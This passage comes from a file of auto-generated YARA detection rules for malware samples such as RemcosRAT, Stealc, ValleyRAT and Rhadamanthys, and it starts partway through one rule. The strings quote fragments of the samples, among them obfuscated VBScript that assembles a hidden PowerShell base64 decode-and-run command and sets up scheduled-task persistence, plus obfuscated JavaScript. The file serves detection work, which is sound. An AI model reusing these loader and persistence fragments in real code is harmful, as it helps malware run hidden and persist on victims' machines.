      $s11 = "ODFmNTMwNWNlOWU0M2ZhYTU4ZjBiMDAzN2JmYWRmYwBtXzVmNTBiNzZkZWQ5MDQ1NjVhZjRhMTdkZDdkY2RmZmYyAG1fYmU1ZmVkNzRjMDZhNGM3YmJkMmRlZTVkNGFh" ascii /* base64 encoded string  */ /* score: '24.00'*/
      $s12 = "NuLZQcLlw1eZQoiaZDmvX9P9LLxjlmFdhT8znkJX4meh91UUZY6mq6QG5WYcrNzgqiCredsB1lgMCwBHL1v3y9l6m38W0YikvGu1J0QfTPWtcn1M0/iklWgxGfoIIEpg" ascii /* score: '24.00'*/
      $s13 = "N2I3ODg0ZGNiMmQAbV9kMmY1MDE1YTJkZjI0OGI1OGFhMjBiNTMyYTFlM2E1MgBtX2MwMjI1OTU0MjEwZjQ2YWI5MjM3NjVkNjNjM2Y0NDY2AG1fNmQ2ODY5MWM3NDA4" ascii /* base64 encoded string  */ /* score: '24.00'*/
      $s14 = "ZTE5ZDVmY2FjMTVjMGYwZGQ5AG1fMmIxYmVmZWUzYTQ0NGVjZjhjOTE4OTdmYjQxMmYzNTAAbV8zZGU4ZTkwYjU1YjY0MWMzYjBiN2ZlZTUyNTc4ZWZhZABtXzZiY2E3" ascii /* base64 encoded string  */ /* score: '24.00'*/
      $s15 = "NDNmZjhkMjY1OTAzZjBkMzZlY2UAbV8yMDk3NjRmNzc2YTQ0MTcxYTZmZTIxNzVmYzU4YjBiNwBtX2E1Zjg2MDMxN2I2YjQ0NzQ5NTJhMjk2YjAxYzNhMTMxAG1fNjNk" ascii /* base64 encoded string */ /* score: '24.00'*/
   condition:
      uint16(0) == 0x6176 and filesize < 5000KB and
      1 of ($x*) and 4 of them
}

rule RustyStealer_signature_ {
   meta:
      description = "_subset_batch - file RustyStealer(signature).mhtml"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "03b49613d35dff8097db363b8943a5a33b10e31cda13df6f5a57f0e28fa7678d"
   strings:
      $s1 = "</head><body><a href=3D\"https://smlwiki.com/\" target=3D\"_blank\" style=3D\"po=" fullword ascii /* score: '27.00'*/
      $s2 = "Content-Location: https://lancewatch.com/logo.gif" fullword ascii /* score: '23.00'*/
      $s3 = "<a href=3D\"https://lancewatch.com/\"><img src=3D\"https://lancewatch.com/logo=" fullword ascii /* score: '22.00'*/
      $s4 = "<a href=3D\"https://lancewatch.com/report.php\"><img src=3D\"https://lancewatc=" fullword ascii /* score: '20.00'*/
      $s5 = "tch.com/\">Go back</a> | <a href=3D\"https://lancewatch.com/lance_images.php\"=" fullword ascii /* score: '20.00'*/
      $s6 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAC" ascii /* base64 encoded string  */ /* score: '18.50'*/
      $s7 = "Content-Location: https://lancewatch.com/main.css" fullword ascii /* score: '18.00'*/
      $s8 = "Content-Location: https://lancewatch.com/assets/image0.JPG" fullword ascii /* score: '18.00'*/
      $s9 = "Content-Location: https://lancewatch.com/button4.1.gif" fullword ascii /* score: '18.00'*/
      $s10 = "Content-Location: https://lancewatch.com/assets/face1.jpg" fullword ascii /* score: '18.00'*/
      $s11 = "Content-Location: https://lancewatch.com/assets/stare-crop.jpg" fullword ascii /* score: '18.00'*/
      $s12 = "Content-Location: https://lancewatch.com/button2.1.gif" fullword ascii /* score: '18.00'*/
      $s13 = "Snapshot-Content-Location: https://lancewatch.com/lance-summary.html" fullword ascii /* score: '18.00'*/
      $s14 = "Content-Location: https://lancewatch.com/ass/bg4.webp" fullword ascii /* score: '18.00'*/
      $s15 = "Content-Location: https://lancewatch.com/cycle.php" fullword ascii /* score: '18.00'*/
   condition:
      uint16(0) == 0x7246 and filesize < 200KB and
      8 of them
}

rule RemcosRAT_signature__6633c215 {
   meta:
      description = "_subset_batch - file RemcosRAT(signature)_6633c215.rar"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "6633c215d97f3b2e4c3026127c47b276ab104609bc564d2313d6ef5bebaee162"
   strings:
      $s1 = "!RFP 6008878171 IKS 3118219095.exe" fullword ascii /* score: '16.00'*/
   condition:
      uint16(0) == 0x6152 and filesize < 70KB and
      all of them
}

rule RemcosRAT_signature__6b3897c1 {
   meta:
      description = "_subset_batch - file RemcosRAT(signature)_6b3897c1.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "6b3897c1830e668a62a95d9cfc8f335d1acce31da25022b4e2e53ca5926c974b"
   strings:
      $s1 = "// a90eccda-6654-4723-ba8c-d9424b9ff70e - 638918079379485901" fullword ascii /* score: '12.00'*/
      $s2 = "51,56,55,55,57,61,51,56,55,55,57,64,51,64,63,57,55,51,64,62,58,62,51,56,55,55,59,56,51,56,55,55,58,64,51,64,63,64,63,51,64,63,59" ascii /* score: '9.00'*/ /* hex encoded string 'QVUUWaQVUUWdQdcWUQdbXbQVUUYVQVUUXdQdcdcQdcY' */
      $s3 = "55,61,55,51,56,55,55,59,57,51,56,55,55,55,63,51,64,63,58,56,51,56,55,55,56,63,51,64,62,60,63,51,56,55,55,57,58,51,64,62,62,64,51" ascii /* score: '9.00'*/ /* hex encoded string 'UaUQVUUYWQVUUUcQdcXVQVUUVcQdb`cQVUUWXQdbbdQ' */
      $s4 = "64,63,64,55,51,56,55,55,59,55,51,59,58,58,55,51,56,55,55,57,59,51,64,63,64,58,51,64,63,57,58,51,64,63,57,61,51,64,62,61,59,51,64" ascii /* score: '9.00'*/ /* hex encoded string 'dcdUQVUUYUQYXXUQVUUWYQdcdXQdcWXQdcWaQdbaYQd' */
      $s5 = "56,55,55,62,59,51,64,63,58,58,51,56,55,55,59,56,51,64,63,64,57,51,63,59,63,61,51,64,62,62,61,51,64,63,64,59,51,56,55,55,58,55,51" ascii /* score: '9.00'*/ /* hex encoded string 'VUUbYQdcXXQVUUYVQdcdWQcYcaQdbbaQdcdYQVUUXUQ' */
      $s6 = "55,55,61,56,51,64,63,58,64,51,64,63,56,61,51,64,63,59,55,51,64,62,60,63,51,56,55,55,57,59,51,56,55,55,59,57,51,56,55,55,60,59,51" ascii /* score: '9.00'*/ /* hex encoded string 'UUaVQdcXdQdcVaQdcYUQdb`cQVUUWYQVUUYWQVUU`YQ' */
      $s7 = "57,51,64,63,57,63,51,56,55,55,58,55,51,56,55,55,56,63,51,64,63,58,61,51,56,55,55,58,55,51,64,62,60,63,51,64,62,59,62,51,56,55,55" ascii /* score: '9.00'*/ /* hex encoded string 'WQdcWcQVUUXUQVUUVcQdcXaQVUUXUQdb`cQdbYbQVUU' */
      $s8 = "56,55,55,59,60,51,64,61,57,56,51,64,63,57,60,51,56,55,55,58,64,51,64,63,63,61,51,56,55,55,55,57,51,64,63,57,62,51,56,55,55,59,57" ascii /* score: '9.00'*/ /* hex encoded string 'VUUY`QdaWVQdcW`QVUUXdQdccaQVUUUWQdcWbQVUUYW' */
      $s9 = "57,60,51,64,63,64,60,51,56,55,55,60,58,51,56,55,55,59,57,51,64,63,64,57,51,64,63,63,64,51,56,55,55,58,62,51,63,59,63,61,51,64,63" ascii /* score: '9.00'*/ /* hex encoded string 'W`Qdcd`QVUU`XQVUUYWQdcdWQdccdQVUUXbQcYcaQdc' */
      $s10 = "63,64,57,51,64,62,62,62,51,56,55,55,58,59,51,64,62,61,62,51,64,62,64,58,51,64,63,56,64,51,56,55,55,59,57,51,64,62,58,59,51,64,62" ascii /* score: '9.00'*/ /* hex encoded string 'cdWQdbbbQVUUXYQdbabQdbdXQdcVdQVUUYWQdbXYQdb' */
      $s11 = "60,56,51,60,56,51,58,61,51,64,62,62,63,51,56,55,55,60,60,51,64,62,62,63,51,64,63,57,62,51,56,55,55,56,64,51,56,55,55,56,57,51,64" ascii /* score: '9.00'*/ /* hex encoded string '`VQ`VQXaQdbbcQVUU``QdbbcQdcWbQVUUVdQVUUVWQd' */
      $s12 = "59,59,51,64,63,56,64,51,56,55,55,60,56,51,64,64,64,61,51,56,55,55,60,58,51,60,60,58,61,55,51,60,62,57,62,58,51,59,58,58,55,51,56" ascii /* score: '9.00'*/ /* hex encoded string 'YYQdcVdQVUU`VQdddaQVUU`XQ``XaUQ`bWbXQYXXUQV' */
      $s13 = "62,62,59,51,64,62,61,61,51,64,63,58,63,51,56,55,55,58,60,51,64,63,57,59,51,64,63,64,55,51,56,55,55,60,58,51,64,62,63,64,51,56,59" ascii /* score: '9.00'*/ /* hex encoded string 'bbYQdbaaQdcXcQVUUX`QdcWYQdcdUQVUU`XQdbcdQVY' */
      $s14 = "56,55,55,59,61,51,64,63,63,63,51,56,55,55,57,64,51,64,63,64,64,51,56,55,55,60,63,51,64,63,57,62,51,64,63,57,61,51,64,63,63,63,51" ascii /* score: '9.00'*/ /* hex encoded string 'VUUYaQdcccQVUUWdQdcddQVUU`cQdcWbQdcWaQdcccQ' */
      $s15 = "63,62,51,64,63,64,56,51,64,63,58,56,51,56,55,55,56,62,51,64,63,64,61,51,64,63,59,55,51,56,55,55,64,56,51,64,63,57,60,51,56,55,55" ascii /* score: '9.00'*/ /* hex encoded string 'cbQdcdVQdcXVQVUUVbQdcdaQdcYUQVUUdVQdcW`QVUU' */
   condition:
      uint16(0) == 0x0a0d and filesize < 4000KB and
      8 of them
}

rule RemcosRAT_signature__b34f154ec913d2d2c435cbd644e91687_imphash__0a31da92 {
   meta:
      description = "_subset_batch - file RemcosRAT(signature)_b34f154ec913d2d2c435cbd644e91687(imphash)_0a31da92.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "0a31da928cc7330ce41d80e3c21cb47076d2d9f42f773da37d3211a3ced2e2cc"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $s2 = "nstall System v3.03</description><dependency><dependentAssembly><assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common" ascii /* score: '13.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      1 of ($x*) and all of them
}

rule RemcosRAT_signature__b34f154ec913d2d2c435cbd644e91687_imphash__66652407 {
   meta:
      description = "_subset_batch - file RemcosRAT(signature)_b34f154ec913d2d2c435cbd644e91687(imphash)_66652407.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "66652407eb97ccfbecac8f5d27296bdff89acd7c0d5350a7610ad41863fc8a4d"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $s2 = "nstall System v3.03</description><dependency><dependentAssembly><assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common" ascii /* score: '13.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      1 of ($x*) and all of them
}

rule RemcosRAT_signature__b34f154ec913d2d2c435cbd644e91687_imphash__6ba75f83 {
   meta:
      description = "_subset_batch - file RemcosRAT(signature)_b34f154ec913d2d2c435cbd644e91687(imphash)_6ba75f83.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "6ba75f83e8b1bb686aed7968589519fccf57bb96eaafb94a75b2341917f6e8ef"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $s2 = "Controls\" version=\"6.0.0.0\" processorArchitecture=\"*\" publicKeyToken=\"6595b64144ccf1df\" language=\"*\" /></dependentAssem" ascii /* score: '25.00'*/
      $s3 = "endency><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivileges><requestedExecutionLevel level=\"as" ascii /* score: '22.00'*/
      $s4 = "nstall System v3.02.1</description><dependency><dependentAssembly><assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Comm" ascii /* score: '13.00'*/
      $s5 = "oker\" uiAccess=\"false\"/></requestedPrivileges></security></trustInfo><compatibility xmlns=\"urn:schemas-microsoft-com:compati" ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      1 of ($x*) and all of them
}

rule RemcosRAT_signature__b34f154ec913d2d2c435cbd644e91687_imphash__8b962cb0 {
   meta:
      description = "_subset_batch - file RemcosRAT(signature)_b34f154ec913d2d2c435cbd644e91687(imphash)_8b962cb0.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "8b962cb04e2472c39a60593ca099b4e1ed00bd580113e9fb356a3fb3870b2be6"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $s2 = "nstall System v3.03</description><dependency><dependentAssembly><assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common" ascii /* score: '13.00'*/
      $s3 = "* [n9X" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      1 of ($x*) and all of them
}

rule RemcosRAT_signature__b34f154ec913d2d2c435cbd644e91687_imphash__c1da7a18 {
   meta:
      description = "_subset_batch - file RemcosRAT(signature)_b34f154ec913d2d2c435cbd644e91687(imphash)_c1da7a18.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "c1da7a18c6786a25068d00d77be9d4d80f808a60c967ced02a1ddce8b268d979"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $s2 = "nstall System v3.03</description><dependency><dependentAssembly><assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common" ascii /* score: '13.00'*/
      $s3 = "jvnfringens" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      1 of ($x*) and all of them
}

rule RemcosRAT_signature__b34f154ec913d2d2c435cbd644e91687_imphash__3d291ad5 {
   meta:
      description = "_subset_batch - file RemcosRAT(signature)_b34f154ec913d2d2c435cbd644e91687(imphash)_3d291ad5.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "3d291ad5e29f666e9ede501c30dd7803842c28835cc8941d101b7359756e95c7"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $s2 = "nstall System v3.03</description><dependency><dependentAssembly><assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common" ascii /* score: '13.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      1 of ($x*) and all of them
}

rule Rhadamanthys_signature__6566b5de91bbc293c6eea50eb6537989_imphash_ {
   meta:
      description = "_subset_batch - file Rhadamanthys(signature)_6566b5de91bbc293c6eea50eb6537989(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "88a82bdbb8f6efe6448316c05c881d65b564efb9bd7588363683fa07d11b8a86"
   strings:
      $s1 = "QuickAssist.exe" fullword wide /* score: '22.00'*/
      $s2 = "            <requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"/>" fullword ascii /* score: '15.00'*/
      $s3 = ".?AV?$ProcessorBase@VDataTransformer@@@@" fullword ascii /* score: '15.00'*/
      $s4 = "        <dpiAware  xmlns=\"http://schemas.microsoft.com/SMI/2005/WindowsSettings\">true</dpiAware>" fullword ascii /* score: '12.00'*/
      $s5 = "            processorArchitecture=\"*\"" fullword ascii /* score: '10.00'*/
      $s6 = ":*:6:C:]:" fullword ascii /* score: '9.00'*/ /* hex encoded string 'l' */
      $s7 = "=.2)#~)=/2)#" fullword ascii /* score: '9.00'*/ /* hex encoded string '"' */
      $s8 = ";!<(>3>9>?>" fullword ascii /* score: '9.00'*/ /* hex encoded string '9' */
      $s9 = "            publicKeyToken=\"6595b64144ccf1df\"" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 5000KB and
      all of them
}

rule Stealc_signature__f3f2becbefab403299b367e6b024bf66_imphash_ {
   meta:
      description = "_subset_batch - file Stealc(signature)_f3f2becbefab403299b367e6b024bf66(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "4bef6f8cef8f5d75ead900b2ea1a3c8fd39aa705a9bb8a66e4e0229ccdcdd5cb"
   strings:
      $s1 = "TTTracer.exe" fullword wide /* score: '22.00'*/
      $s2 = "OpenProcessToken failed. Error: " fullword ascii /* score: '21.00'*/
      $s3 = "First GetTokenInformation failed. Error: " fullword ascii /* score: '15.00'*/
      $s4 = "LookupAccountSid failed. Error: " fullword ascii /* score: '13.00'*/
      $s5 = "7-^4=6-^4~" fullword ascii /* score: '9.00'*/ /* hex encoded string 'td' */
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      all of them
}

rule ValleyRAT_signature__156a54e97cf1946122707df0c1097408_imphash_ {
   meta:
      description = "_subset_batch - file ValleyRAT(signature)_156a54e97cf1946122707df0c1097408(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "cf368705c5cd6cd0f824d5ca8b5f187488fbd4d436a93a60f57f8cfd6a004398"
   strings:
      $s1 = "      <!--See http://msdn.microsoft.com/en-us/library/hh848036%28v=vs.85%29.aspx for definitions-->" fullword ascii /* score: '17.00'*/
      $s2 = "  VirtualQuery failed for %d bytes at address %p" fullword ascii /* score: '13.00'*/
      $s3 = "%d bit pseudo relocation at %p out of range, targeting %p, yielding the value %p." fullword ascii /* score: '12.50'*/
      $s4 = "        <ms_asmv3:requestedExecutionLevel" fullword ascii /* score: '11.00'*/
      $s5 = "           processorArchitecture=\"x86\" />" fullword ascii /* score: '10.00'*/
      $s6 = "     processorArchitecture=\"x86\" />" fullword ascii /* score: '10.00'*/
      $s7 = "VSJITDEBUGGER.ICO(" fullword wide /* score: '10.00'*/
      $s8 = "           publicKeyToken=\"6595b64144ccf1df\"" fullword ascii /* score: '8.00'*/
      $s9 = "      <!--Windows Vista -->" fullword ascii /* score: '8.00'*/
      $s10 = "      <!--Windows 7 -->" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 200KB and
      all of them
}

rule ValleyRAT_signature_ {
   meta:
      description = "_subset_batch - file ValleyRAT(signature).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "6f469bcf94ec8965587220ac917b235ec7f3c3bd0c29a65bb0726ce2489736f4"
   strings:
      $s1 = "D:\\jenkins_agent\\workspace\\windows_desktop_new_installer_build\\line-updater\\LineInstaller\\bin\\LineInstaller.pdb" fullword ascii /* score: '27.00'*/
      $s2 = "      <assemblyIdentity type='win32'     name='Microsoft.Windows.Common-Controls' version='6.0.0.0'     processorArchitecture='*" ascii /* score: '27.00'*/
      $s3 = " https://docs.microsoft.com/windows/win32/fileio/maximum-file-path-limitation -->" fullword ascii /* score: '26.00'*/
      $s4 = "SHCore.dll" fullword wide /* score: '23.00'*/
      $s5 = "LineInstaller.exe" fullword wide /* score: '22.00'*/
      $s6 = "ZcInst.exe" fullword wide /* score: '22.00'*/
      $s7 = "      <assemblyIdentity type='win32'     name='Microsoft.Windows.Common-Controls' version='6.0.0.0'     processorArchitecture='*" ascii /* score: '21.00'*/
      $s8 = "\"http://ocsp2.globalsign.com/rootr606" fullword ascii /* score: '20.00'*/
      $s9 = "!http://ocsp.globalsign.com/rootr30;" fullword ascii /* score: '20.00'*/
      $s10 = "Hapi-ms-win-core-synch-l1-2-0.dll" fullword wide /* score: '20.00'*/
      $s11 = "OK]I agree to the [LY Corporation Common Terms of Use|https://terms.line.me/line_terms?lang=en].HAn error occurred while install" wide /* score: '18.00'*/
      $s12 = "-http://ocsp.globalsign.com/codesigningrootr450F" fullword ascii /* score: '16.00'*/
      $s13 = ":http://secure.globalsign.com/cacert/codesigningrootr45.crt0A" fullword ascii /* score: '16.00'*/
      $s14 = "%http://crl.globalsign.com/root-r6.crl0G" fullword ascii /* score: '16.00'*/
      $s15 = "0http://crl.globalsign.com/codesigningrootr45.crl0U" fullword ascii /* score: '16.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 8000KB and
      8 of them
}

rule RemcosRAT_signature__6f0877cd {
   meta:
      description = "_subset_batch - file RemcosRAT(signature)_6f0877cd.vbs"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "6f0877cdcc9b0b0c6837fe90e9f8d2492f36471cb57a477e24b57530d16b5ec9"
   strings:
      $s1 = "execute(\"\" & aqxhywfjuolxpvtu & \".Run \"\"powershell.exe \" & fpuwlgrbedmduksu & \"\"\", 0, false\")" fullword wide /* score: '21.00'*/
      $s2 = "execute( \"set \" & aqxhywfjuolxpvtu & \" = CreateObject(\"\"WScript.Shell\"\")\" )" fullword wide /* score: '17.00'*/
      $s3 = "TnOj = dnBWh.ExpandEnvironmentStrings(\"%TEMP%\")" fullword wide /* score: '15.00'*/
      $s4 = "GonLG = WScript.ScriptFullName" fullword wide /* score: '14.00'*/
      $s5 = "dnBWh.Run kxDKx , lUato , TAiHD" fullword wide /* score: '13.00'*/
      $s6 = "dnBWh.Run JKmvD, lUato , TAiHD" fullword wide /* score: '13.00'*/
      $s7 = "Set dnBWh = CreateObject(\"WScript.Shell\")" fullword wide /* score: '12.00'*/
      $s8 = "fpuwlgrbedmduksu = fpuwlgrbedmduksu & \";$Yolopolhggobek = [system.Text.Encoding]::Unicode.GetString($IgvVM);\"" fullword wide /* score: '12.00'*/
      $s9 = "fpuwlgrbedmduksu = fpuwlgrbedmduksu & \";$Yolopolhggobek = ($Yolopolhggobek -replace '%fOyRe%', '\" & GonLG.replace(\"\\\",\"$\"" wide /* score: '12.00'*/
      $s10 = "fpuwlgrbedmduksu = fpuwlgrbedmduksu & \";$IgvVM = [system.Convert]::FromBase64String( $MgOrq );\"" fullword wide /* score: '11.00'*/
      $s11 = "Set objFSO = CreateObject(\"Scripting.FileSystemObject\")" fullword wide /* score: '10.00'*/
      $s12 = "fpuwlgrbedmduksu = fpuwlgrbedmduksu & \";powershell $Yolopolhggobek;\"" fullword wide /* score: '9.00'*/
      $s13 = "kxDKx = \"scht\" & \"asks /del\" & \"ete /tn \" & Mojtb & \" /f\"" fullword wide /* score: '8.00'*/
      $s14 = "JKmvD = \"scht\" & \"asks /cr\" & \"eate /tn \" & Mojtb & \" /tr \"\"\" & mJbel & \"\"\" /sc min\" & \"ute /mo 1\"" fullword wide /* score: '8.00'*/
      $s15 = "fpuwlgrbedmduksu = fpuwlgrbedmduksu & \";$MgOrq = ($IuJUJJZz -replace '" fullword wide /* score: '8.00'*/
   condition:
      uint16(0) == 0xfeff and filesize < 10000KB and
      8 of them
}

rule RemcosRAT_signature__932791f5 {
   meta:
      description = "_subset_batch - file RemcosRAT(signature)_932791f5.vbs"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "932791f59371b7a69c112bedde0a369f77b03ce6ab3f4cb1c08be7ff49846137"
   strings:
      $s1 = "execute(\"\" & ywhmummgpupawtmh & \".Run \"\"powershell.exe \" & bcucuvkkoaudyrem & \"\"\", 0, false\")" fullword wide /* score: '21.00'*/
      $s2 = "execute( \"set \" & ywhmummgpupawtmh & \" = CreateObject(\"\"WScript.Shell\"\")\" )" fullword wide /* score: '17.00'*/
      $s3 = "TnOj = dnBWh.ExpandEnvironmentStrings(\"%TEMP%\")" fullword wide /* score: '15.00'*/
      $s4 = "GonLG = WScript.ScriptFullName" fullword wide /* score: '14.00'*/
      $s5 = "dnBWh.Run kxDKx , lUato , TAiHD" fullword wide /* score: '13.00'*/
      $s6 = "dnBWh.Run JKmvD, lUato , TAiHD" fullword wide /* score: '13.00'*/
      $s7 = "Set dnBWh = CreateObject(\"WScript.Shell\")" fullword wide /* score: '12.00'*/
      $s8 = "bcucuvkkoaudyrem = bcucuvkkoaudyrem & \";$Yolopolhggobek = [system.Text.Encoding]::Unicode.GetString($IgvVM);\"" fullword wide /* score: '12.00'*/
      $s9 = "bcucuvkkoaudyrem = bcucuvkkoaudyrem & \";$Yolopolhggobek = ($Yolopolhggobek -replace '%fOyRe%', '\" & GonLG.replace(\"\\\",\"$\"" wide /* score: '12.00'*/
      $s10 = "bcucuvkkoaudyrem = bcucuvkkoaudyrem & \";$IgvVM = [system.Convert]::FromBase64String( $MgOrq );\"" fullword wide /* score: '11.00'*/
      $s11 = "Set objFSO = CreateObject(\"Scripting.FileSystemObject\")" fullword wide /* score: '10.00'*/
      $s12 = "bcucuvkkoaudyrem = bcucuvkkoaudyrem & \";powershell $Yolopolhggobek;\"" fullword wide /* score: '9.00'*/
      $s13 = "kxDKx = \"scht\" & \"asks /del\" & \"ete /tn \" & Mojtb & \" /f\"" fullword wide /* score: '8.00'*/
      $s14 = "JKmvD = \"scht\" & \"asks /cr\" & \"eate /tn \" & Mojtb & \" /tr \"\"\" & mJbel & \"\"\" /sc min\" & \"ute /mo 1\"" fullword wide /* score: '8.00'*/
      $s15 = "bcucuvkkoaudyrem = bcucuvkkoaudyrem & \";$MgOrq = ($IuJUJJZz -replace '" fullword wide /* score: '8.00'*/
   condition:
      uint16(0) == 0xfeff and filesize < 10000KB and
      8 of them
}

rule RemcosRAT_signature__b8aae9a5 {
   meta:
      description = "_subset_batch - file RemcosRAT(signature)_b8aae9a5.vbs"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "b8aae9a506fea0ae59c1bab1d46ad400597a741c5c009a20e13ac4e0c55fac0e"
   strings:
      $s1 = "execute(\"\" & lndntpmknjpxeiwl & \".Run \"\"powershell.exe \" & wwlituuibybuouqf & \"\"\", 0, false\")" fullword wide /* score: '21.00'*/
      $s2 = "execute( \"set \" & lndntpmknjpxeiwl & \" = CreateObject(\"\"WScript.Shell\"\")\" )" fullword wide /* score: '17.00'*/
      $s3 = "TnOj = dnBWh.ExpandEnvironmentStrings(\"%TEMP%\")" fullword wide /* score: '15.00'*/
      $s4 = "GonLG = WScript.ScriptFullName" fullword wide /* score: '14.00'*/
      $s5 = "dnBWh.Run kxDKx , lUato , TAiHD" fullword wide /* score: '13.00'*/
      $s6 = "dnBWh.Run JKmvD, lUato , TAiHD" fullword wide /* score: '13.00'*/
      $s7 = "Set dnBWh = CreateObject(\"WScript.Shell\")" fullword wide /* score: '12.00'*/
      $s8 = "wwlituuibybuouqf = wwlituuibybuouqf & \";$Yolopolhggobek = [system.Text.Encoding]::Unicode.GetString($IgvVM);\"" fullword wide /* score: '12.00'*/
      $s9 = "wwlituuibybuouqf = wwlituuibybuouqf & \";$Yolopolhggobek = ($Yolopolhggobek -replace '%fOyRe%', '\" & GonLG.replace(\"\\\",\"$\"" wide /* score: '12.00'*/
      $s10 = "wwlituuibybuouqf = wwlituuibybuouqf & \";$IgvVM = [system.Convert]::FromBase64String( $MgOrq );\"" fullword wide /* score: '11.00'*/
      $s11 = "Set objFSO = CreateObject(\"Scripting.FileSystemObject\")" fullword wide /* score: '10.00'*/
      $s12 = "wwlituuibybuouqf = wwlituuibybuouqf & \";powershell $Yolopolhggobek;\"" fullword wide /* score: '9.00'*/
      $s13 = "kxDKx = \"scht\" & \"asks /del\" & \"ete /tn \" & Mojtb & \" /f\"" fullword wide /* score: '8.00'*/
      $s14 = "JKmvD = \"scht\" & \"asks /cr\" & \"eate /tn \" & Mojtb & \" /tr \"\"\" & mJbel & \"\"\" /sc min\" & \"ute /mo 1\"" fullword wide /* score: '8.00'*/
      $s15 = "wwlituuibybuouqf = wwlituuibybuouqf & \";$MgOrq = ($IuJUJJZz -replace '" fullword wide /* score: '8.00'*/
   condition:
      uint16(0) == 0xfeff and filesize < 10000KB and
      8 of them
}

rule RemcosRAT_signature__76e3f0ae {
   meta:
      description = "_subset_batch - file RemcosRAT(signature)_76e3f0ae.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "76e3f0ae9a0f5759b122f17de5bc70652b3f2d284a0466dc48c79aa4f55c92f7"
   strings:
      $x1 = "')[_0x496020(0x1ae)](''));function getRandomInt(_0x273882,_0x3280fc){var _0x58beaf=_0x496020;return _0x273882=Math[_0x58beaf(0x1" ascii /* score: '39.00'*/
      $x2 = "(function(_0x1271e9,_0x5f01fa){var _0x45f6aa=_0x266c,_0x242890=_0x1271e9();while(!![]){try{var _0x469a9e=parseInt(_0x45f6aa(0x10" ascii /* score: '36.00'*/
      $x3 = "')[_0x519aac(0x1c3)](''),0x0,![]);function getRandomInt(_0x1bbccc,_0x4e3f82){var _0x5a5065=_0x519aac;return _0x1bbccc=Math[_0x5a" ascii /* score: '36.00'*/
      $x4 = "','29702wReuFn','attachEvent','1105475aEYSRg','3994760qVyYxn'];_0x2331=function(){return _0x442583;};return _0x2331();}function " ascii /* score: '36.00'*/
      $x5 = "')[_0x51e4d7(0x1dc)]('');function getRandomInt(_0x4cdeb9,_0x328ad4){var _0xfaa6ba=_0x51e4d7;return _0x4cdeb9=Math[_0xfaa6ba(0x1c" ascii /* score: '36.00'*/
      $s6 = "')[_0x54d0ef(0x128)]('');function getRandomInt(_0x5de012,_0x26ac5d){var _0x2e0303=_0x54d0ef;return _0x5de012=Math[_0x2e0303(0x13" ascii /* score: '30.00'*/
